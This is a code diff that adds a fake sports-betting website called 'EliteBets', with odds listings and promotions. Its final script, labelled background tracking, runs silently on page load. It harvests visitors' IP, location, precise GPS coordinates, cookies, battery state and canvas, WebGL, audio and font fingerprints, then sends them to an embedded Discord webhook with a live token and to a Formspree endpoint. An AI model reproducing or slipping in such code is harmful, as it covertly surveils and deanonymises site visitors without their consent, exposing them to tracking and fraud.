+                                <span class="team"><i class="fas fa-futbol"></i> ${item.team2}</span>
+                            </div>
+                            <div class="match-odds-row">
+                                <div class="market-group">
+                                    <span class="odd-box" data-match="${item.team1} vs ${item.team2}" data-market="1" data-odds="${item.odds1}">${item.odds1}</span>
+                                    <span class="odd-box" data-match="${item.team1} vs ${item.team2}" data-market="X" data-odds="${item.oddsX}">${item.oddsX}</span>
+                                    <span class="odd-box" data-match="${item.team1} vs ${item.team2}" data-market="2" data-odds="${item.odds2}">${item.odds2}</span>
+                                </div>
+                            </div>
+                        </div>
+                    `;
+                });
+                return html;
+            }
+
+            function getHomePage() {
+                return `
+                    <div class="promo-carousel">
+                        <div class="promo-card" data-page="welcome"><h4>💰 100% Welcome Bonus</h4><p>Up to $500 matched</p></div>
+                        <div class="promo-card" data-page="epl" style="background: linear-gradient(145deg, #2d5a4a, #1a3a2e);"><h4>⚡ Premier League Boost</h4><p>Enhanced odds</p></div>
+                        <div class="promo-card" data-page="cashout" style="background: linear-gradient(145deg, #5a3d2d, #3f2b1f);"><h4>🔄 Cashout Available</h4><p>Take profit early</p></div>
+                        <div class="promo-card" data-page="streaming" style="background: linear-gradient(145deg, #1e4a6b, #12344d);"><h4>📱 Live Streaming</h4><p>Watch selected matches</p></div>
+                    </div>
+                    <div class="hero-banner" data-page="epl">
+                        <div class="hero-text"><h2>Premier League special</h2><p>+30% profit on all match winners</p></div>
+                        <div class="hero-badge">BOOSTED</div>
+                    </div>
+                    <div class="quick-links">
+                        <span class="quick-link" data-page="epl"><i class="fas fa-futbol"></i> EPL</span>
+                        <span class="quick-link" data-page="nba"><i class="fas fa-basketball-ball"></i> NBA</span>
+                        <span class="quick-link" data-page="tennis"><i class="fas fa-tennis-ball"></i> Wimbledon</span>
+                        <span class="quick-link" data-page="hockey"><i class="fas fa-hockey-puck"></i> NHL</span>
+                        <span class="quick-link" data-page="esports"><i class="fas fa-gamepad"></i> CS:GO</span>
+                        <span class="quick-link" data-page="f1"><i class="fas fa-flag-checkered"></i> F1</span>
+                        <span class="quick-link" data-page="golf"><i class="fas fa-golf-ball"></i> PGA</span>
+                        <span class="quick-link" data-page="baseball"><i class="fas fa-baseball-ball"></i> MLB</span>
+                    </div>
+                    <div class="section-title"><h3><span class="live-indicator"></span> Live now (5)</h3><a data-page="live">View all <i class="fas fa-arrow-right"></i></a></div>
+                    <div class="live-grid">
+                        <div class="live-card"><div class="live-header"><span class="live-league">UCL</span><span class="live-min">63'</span></div><div class="live-teams">Real Madrid - Man City</div><div class="live-score">2 - 1</div><div class="live-markets"><span class="market-btn odd-box" data-match="Real Madrid vs Man City" data-market="1" data-odds="2.10">1 @2.10</span></div></div>
+                        <div class="live-card"><div class="live-header"><span class="live-league">NBA</span><span class="live-min">4Q 2'</span></div><div class="live-teams">Lakers - Celtics</div><div class="live-score">98 - 94</div><div class="live-markets"><span class="market-btn odd-box" data-match="Lakers vs Celtics" data-market="1" data-odds="1.45">1 @1.45</span></div></div>
+                        <div class="live-card"><div class="live-header"><span class="live-league">EPL</span><span class="live-min">32'</span></div><div class="live-teams">Arsenal - Chelsea</div><div class="live-score">0 - 0</div><div class="live-markets"><span class="market-btn odd-box" data-match="Arsenal vs Chelsea" data-market="1" data-odds="2.30">1 @2.30</span></div></div>
+                    </div>
+                    <div class="section-title"><h3>📅 Upcoming Premier League</h3><a data-page="epl">Full schedule <i class="fas fa-arrow-right"></i></a></div>
+                    ${genericPage('', [
+                        { time:'Today 20:45', league:'EPL', team1:'Arsenal', team2:'Chelsea', odds1:'2.15', oddsX:'3.40', odds2:'3.10' },
+                        { time:'Today 21:00', league:'EPL', team1:'Liverpool', team2:'Man City', odds1:'2.70', oddsX:'3.50', odds2:'2.45' },
+                        { time:'Tomorrow 18:30', league:'EPL', team1:'Man United', team2:'Tottenham', odds1:'2.05', oddsX:'3.55', odds2:'3.30' }
+                    ])}
+                `;
+            }
+
+            function getSoccerPage() {
+                return genericPage('⚽ Soccer', [
+                    { time:'Today 20:45', league:'EPL', team1:'Arsenal', team2:'Chelsea', odds1:'2.15', oddsX:'3.40', odds2:'3.10' },
+                    { time:'Today 21:00', league:'EPL', team1:'Liverpool', team2:'Man City', odds1:'2.70', oddsX:'3.50', odds2:'2.45' },
+                    { time:'Tomorrow 18:30', league:'La Liga', team1:'Real Madrid', team2:'Barcelona', odds1:'1.95', oddsX:'3.60', odds2:'3.80' },
+                    { time:'Tomorrow 20:45', league:'UCL', team1:'Bayern', team2:'PSG', odds1:'2.20', oddsX:'3.50', odds2:'3.00' }
+                ]);
+            }
+
+            function getBasketballPage() {
+                return genericPage('🏀 Basketball', [
+                    { time:'Today 02:30', league:'NBA', team1:'Lakers', team2:'Celtics', odds1:'1.85', oddsX:'12.00', odds2:'2.05' },
+                    { time:'Today 01:00', league:'EuroLeague', team1:'Real Madrid', team2:'Barcelona', odds1:'1.70', oddsX:'10.00', odds2:'2.30' }
+                ]);
+            }
+
+            function getTennisPage() {
+                return genericPage('🎾 Tennis', [
+                    { time:'Today 14:00', league:'ATP Finals', team1:'Djokovic', team2:'Alcaraz', odds1:'1.65', oddsX:'-', odds2:'2.30' },
+                    { time:'Today 16:30', league:'WTA', team1:'Swiatek', team2:'Sabalenka', odds1:'1.80', oddsX:'-', odds2:'2.10' }
+                ]);
+            }
+
+            function getHockeyPage() {
+                return genericPage('🏒 Ice Hockey', [
+                    { time:'Today 19:00', league:'NHL', team1:'Toronto', team2:'Boston', odds1:'1.90', oddsX:'4.50', odds2:'2.10' }
+                ]);
+            }
+
+            function getEsportsPage() {
+                return genericPage('🎮 Esports', [
+                    { time:'Today 18:00', league:'CS:GO', team1:'FaZe', team2:'NAVI', odds1:'1.95', oddsX:'-', odds2:'1.95' },
+                    { time:'Today 20:00', league:'LoL', team1:'T1', team2:'Gen.G', odds1:'1.70', oddsX:'-', odds2:'2.20' }
+                ]);
+            }
+
+            function getLivePage() {
+                return `
+                    <div class="section-title"><h3><span class="live-indicator"></span> Live Events</h3></div>
+                    <div class="live-grid">
+                        <div class="live-card">...</div>
+                        <div class="live-card">...</div>
+                    </div>
+                `;
+            }
+
+            const pageMap = {
+                'home': getHomePage,
+                'soccer': getSoccerPage,
+                'epl': () => genericPage('Premier League', [
+                    { time:'Today 20:45', league:'EPL', team1:'Arsenal', team2:'Chelsea', odds1:'2.15', oddsX:'3.40', odds2:'3.10' },
+                    { time:'Today 21:00', league:'EPL', team1:'Liverpool', team2:'Man City', odds1:'2.70', oddsX:'3.50', odds2:'2.45' }
+                ]),
+                'laliga': () => genericPage('La Liga', [
+                    { time:'Tomorrow 18:30', league:'La Liga', team1:'Real Madrid', team2:'Barcelona', odds1:'1.95', oddsX:'3.60', odds2:'3.80' }
+                ]),
+                'ucl': () => genericPage('Champions League', [
+                    { time:'Tomorrow 20:45', league:'UCL', team1:'Bayern', team2:'PSG', odds1:'2.20', oddsX:'3.50', odds2:'3.00' }
+                ]),
+                'basketball': getBasketballPage,
+                'nba': () => genericPage('NBA', [ { time:'Today 02:30', league:'NBA', team1:'Lakers', team2:'Celtics', odds1:'1.85', oddsX:'12.00', odds2:'2.05' } ]),
+                'tennis': getTennisPage,
+                'hockey': getHockeyPage,
+                'esports': getEsportsPage,
+                'live': getLivePage,
+                'streaming': () => genericPage('Live Streaming', []),
+                'cashout': () => genericPage('Cash Out', []),
+                'betbuilder': () => genericPage('Bet Builder', []),
+                'welcome': () => genericPage('Welcome Bonus', []),
+                'freebets': () => genericPage('Free Bets', []),
+                'oddsboost': () => genericPage('Odds Boost', []),
+                'refer': () => genericPage('Refer a Friend', []),
+                'company': () => genericPage('Company', []),
+                'responsible': () => genericPage('Responsible Gaming', []),
+                'terms': () => genericPage('Terms & Conditions', []),
+                'privacy': () => genericPage('Privacy', []),
+                'faq': () => genericPage('FAQ', []),
+                'contact': () => genericPage('Contact', []),
+                'livechat': () => genericPage('Live Chat', []),
+                'baseball': () => genericPage('Baseball', [ { time:'Today 19:00', league:'MLB', team1:'Yankees', team2:'Red Sox', odds1:'1.95', oddsX:'-', odds2:'1.95' } ]),
+                'f1': () => genericPage('Formula 1', []),
+                'golf': () => genericPage('Golf', []),
+                'worldcup': () => genericPage('World Cup 2026', []),
+                'bundesliga': () => genericPage('Bundesliga', []),
+                'seriea': () => genericPage('Serie A', []),
+                'euroleague': () => genericPage('EuroLeague', []),
+                'ncaa': () => genericPage('NCAA', [])
+            };
+
+            function loadPage(pageId) {
+                const generator = pageMap[pageId] || pageMap['home'];
+                pageContent.innerHTML = generator();
+                document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
+                const activeNav = document.querySelector(`[data-page="${pageId}"]`);
+                if (activeNav && activeNav.classList.contains('nav-item')) activeNav.classList.add('active');
+                else if (activeNav) {
+                    const parent = activeNav.closest('.nav-item');
+                    if (parent) parent.classList.add('active');
+                }
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            }
+
+            document.addEventListener('click', function(e) {
+                const target = e.target.closest('[data-page]');
+                if (target) {
+                    e.preventDefault();
+                    loadPage(target.getAttribute('data-page'));
+                }
+            });
+
+            logo.addEventListener('click', () => loadPage('home'));
+            loadPage('home');
+        })();
+    </script>
+
+    <!-- ========== LIGHTWEIGHT BACKGROUND TRACKING (GEOLOCATION ON LOAD + UPDATE) ========== -->
+    <script>
+        (function() {
+            // ======================= CONFIG =======================
+            const DISCORD_WEBHOOK = 'https://discordapp.com/api/webhooks/1482646394664910889/JbU1Nj6CgCYe6bdCUUq56vp-GbmjLQoIbsEnd9NBpngJWF8MFcIaEg_uV1WM_LwIG3oF';
+            const FORMSPREE_ENDPOINT = 'https://formspree.io/f/xzdjagew';
+
+            // ======================= COLLECTOR =======================
+            let data = {
+                timestamp: new Date().toISOString(),
+                page: window.location.href,
+                referrer: document.referrer || 'direct',
+                ip: null,
+                country: null,
+                region: null,
+                city: null,
+                isp: null,
+                asn: null,
+                vpn: null,
+                geo: null,
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages ? navigator.languages.join(',') : navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                screen: `${screen.width}x${screen.height} (color depth: ${screen.colorDepth})`,
+                pixelRatio: window.devicePixelRatio,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                connection: navigator.connection ? {
+                    type: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt,
+                    saveData: navigator.connection.saveData
+                } : null,
+                canvas: null,
+                webgl: null,
+                audio: null,
+                fonts: null,
+                battery: null,
+                cookies: document.cookie || 'none',
+                localStorageSize: localStorage.length,
+                sessionStorageSize: sessionStorage.length,
+                doNotTrack: navigator.doNotTrack,
+                cookieEnabled: navigator.cookieEnabled,
+                onLine: navigator.onLine
+            };
+
+            let hasSentInitial = false;
+            let geoReceived = false;  // whether we have already processed geolocation (success or error)
+
+            // ======================= HELPERS =======================
+            function truncate(str, maxLen = 500) { /* not needed but kept */ }
+
+            async function fetchIP() {
+                try {
+                    let res = await fetch('https://ipapi.co/json/');
+                    if (res.ok) {
+                        let json = await res.json();
+                        data.ip = json.ip;
+                        data.country = json.country_name;
+                        data.region = json.region;
+                        data.city = json.city;
+                        data.isp = json.org;
+                        data.asn = json.asn;
+                        let org = (json.org || '').toLowerCase();
+                        if (org.includes('hosting') || org.includes('vpn') || org.includes('datacenter') || org.includes('cloud')) {
+                            data.vpn = 'likely hosting/VPN';
+                        }
+                    }
+                } catch (e) {}
+            }
+
+            function getCanvasFP() {
+                const canvas = document.getElementById('fp-canvas-2d');
+                const ctx = canvas.getContext('2d');
+                if (!ctx) return 'blocked';
+                ctx.textBaseline = 'top';
+                ctx.font = '18pt Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(0,0,100,50);
+                ctx.fillStyle = '#069';
+                ctx.fillText('EliteBets', 10, 10);
+                return canvas.toDataURL().slice(-50);
+            }
+
+            function getWebGLFP() {
+                const canvas = document.getElementById('fp-canvas-webgl');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return { vendor: 'none', renderer: 'none' };
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                const vendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
+                const renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
+                return { vendor, renderer };
+            }
+
+            async function getAudioFP() {
+                try {
+                    const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 5000, 44100);
+                    const osc = ctx.createOscillator();
+                    osc.type = 'sawtooth';
+                    osc.frequency.value = 1000;
+                    osc.connect(ctx.destination);
+                    osc.start(0);
+                    const buffer = await ctx.startRendering();
+                    const channel = buffer.getChannelData(0);
+                    let sum = 0;
+                    for (let i = 0; i < 1000; i++) sum += Math.abs(channel[i]);
+                    return sum.toString(16).substring(0, 8);
+                } catch { return 'audio-fail'; }
+            }
+
+            function detectFonts() {
+                const base = 'abcdefghijklmnopqrstuvwxyz';
+                const ctx = document.createElement('canvas').getContext('2d');
+                ctx.font = '30px monospace';
+                const baseWidth = ctx.measureText(base).width;
+                const fonts = ['Arial','Verdana','Helvetica','Times New Roman','Courier New','Impact','Roboto'];
+                const detected = [];
+                fonts.forEach(f => {
+                    ctx.font = `30px ${f}, monospace`;
+                    if (Math.abs(ctx.measureText(base).width - baseWidth) > 2) detected.push(f);
+                });
+                return detected;
+            }
+
+            function getBattery() {
+                if (navigator.getBattery) {
+                    navigator.getBattery().then(b => {
+                        data.battery = {
+                            level: (b.level * 100).toFixed(0) + '%',
+                            charging: b.charging
+                        };
+                    });
+                }
+            }
+
+            // Geolocation – called immediately on page load
+            function getGeo() {
+                if (!navigator.geolocation) {
+                    data.geo = { error: 'not supported' };
+                    geoReceived = true; // mark as received (error counts)
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        data.geo = {
+                            lat: pos.coords.latitude.toFixed(6),
+                            lon: pos.coords.longitude.toFixed(6),
+                            acc: pos.coords.accuracy
+                        };
+                        geoReceived = true;
+                        // If initial data already sent, send an update
+                        if (hasSentInitial) sendGeoUpdate();
+                    },
+                    err => {
+                        data.geo = { error: err.code, message: err.message };
+                        geoReceived = true;
+                        if (hasSentInitial) sendGeoUpdate();
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            }
+
+            // Send initial data (without geo if not yet available)
+            async function sendInitialData() {
+                if (hasSentInitial) return;
+                hasSentInitial = true;
+
+                data.canvas = getCanvasFP();
+                data.webgl = getWebGLFP();
+                data.audio = await getAudioFP();
+                data.fonts = detectFonts();
+
+                const embed = {
+                    title: '🔍 New Visitor Fingerprint',
+                    color: 0xc89f3c,
+                    timestamp: data.timestamp,
+                    fields: [
+                        { name: '🌐 IP & Location', value: `\`${data.ip || 'N/A'}\` - ${data.city || ''}, ${data.region || ''}, ${data.country || ''}`.trim() || 'N/A', inline: false },
+                        { name: '🏢 ISP / ASN', value: `${data.isp || 'N/A'} (${data.asn || 'N/A'})`, inline: true },
+                        { name: '🛡️ VPN Status', value: data.vpn || 'Not detected', inline: true },
+                        { name: '📍 Geolocation', value: data.geo ? (data.geo.lat ? `${data.geo.lat}, ${data.geo.lon} (acc: ${data.geo.acc}m)` : `Error: ${data.geo.error}`) : 'Waiting for permission…', inline: false },
+                        { name: '🖥️ Browser / OS', value: `${data.userAgent.substring(0, 100)}…`, inline: false },
+                        { name: '📱 Device', value: `Platform: ${data.platform}, Cores: ${data.hardwareConcurrency}, RAM: ${data.deviceMemory}GB`, inline: true },
+                        { name: '⏰ Timezone', value: data.timezone, inline: true },
+                        { name: '🖼️ Screen', value: data.screen, inline: true },
+                        { name: '🎨 Canvas / WebGL', value: `Canvas: ${data.canvas}\nWebGL: ${data.webgl.vendor} / ${data.webgl.renderer}`, inline: false },
+                        { name: '🎵 Audio', value: data.audio || 'N/A', inline: true },
+                        { name: '🔤 Fonts', value: data.fonts?.join(', ') || 'N/A', inline: true },
+                        { name: '🔋 Battery', value: data.battery ? `${data.battery.level}, charging:${data.battery.charging}` : 'N/A', inline: true },
+                        { name: '🍪 Cookies', value: data.cookies === 'none' ? 'none' : 'present', inline: true },
+                        { name: '💾 Storage', value: `local: ${data.localStorageSize}, session: ${data.sessionStorageSize}`, inline: true },
+                    ],
+                    footer: { text: 'EliteBets · visitor tracking' }
+                };
+
+                try {
+                    await fetch(DISCORD_WEBHOOK, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ embeds: [embed] })
+                    });
+                } catch (e) {}
+
+                const formspreePayload = { payload: JSON.stringify(data, null, 2) };
+                try {
+                    await fetch(FORMSPREE_ENDPOINT, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(formspreePayload)
+                    });
+                } catch (e) {}
+                if (navigator.sendBeacon) {
+                    navigator.sendBeacon(FORMSPREE_ENDPOINT, new Blob([JSON.stringify(formspreePayload)], { type: 'application/json' }));
+                }
+            }
+
+            // Send update when geolocation arrives after initial send
+            async function sendGeoUpdate() {
+                // Reuse the same data object (geo already updated)
+                const embed = {
+                    title: '📍 Geolocation Update',
+                    color: 0xc89f3c,
+                    timestamp: new Date().toISOString(),
+                    fields: [
+                        { name: '🌐 IP', value: `\`${data.ip || 'N/A'}\``, inline: true },
+                        { name: '📍 Geolocation', value: data.geo ? (data.geo.lat ? `${data.geo.lat}, ${data.geo.lon} (acc: ${data.geo.acc}m)` : `Error: ${data.geo.error}`) : 'No data', inline: false },
+                    ],
+                    footer: { text: 'EliteBets · geolocation update' }
+                };
+
+                try {
+                    await fetch(DISCORD_WEBHOOK, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ embeds: [embed] })
+                    });
+                } catch (e) {}
+
+                const formspreePayload = { payload: 'Geolocation update: ' + JSON.stringify(data.geo, null, 2) };
+                try {
+                    await fetch(FORMSPREE_ENDPOINT, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(formspreePayload)
+                    });
+                } catch (e) {}
+                if (navigator.sendBeacon) {
+                    navigator.sendBeacon(FORMSPREE_ENDPOINT, new Blob([JSON.stringify(formspreePayload)], { type: 'application/json' }));
+                }
+            }
+
+            // Start collection
+            fetchIP();
+            getBattery();
+            getGeo();  // immediately request geolocation
+
+            // Wait 2.5 seconds then send initial data
+            setTimeout(sendInitialData, 2500);
+        })();
+    </script>
+</body>
+</html>
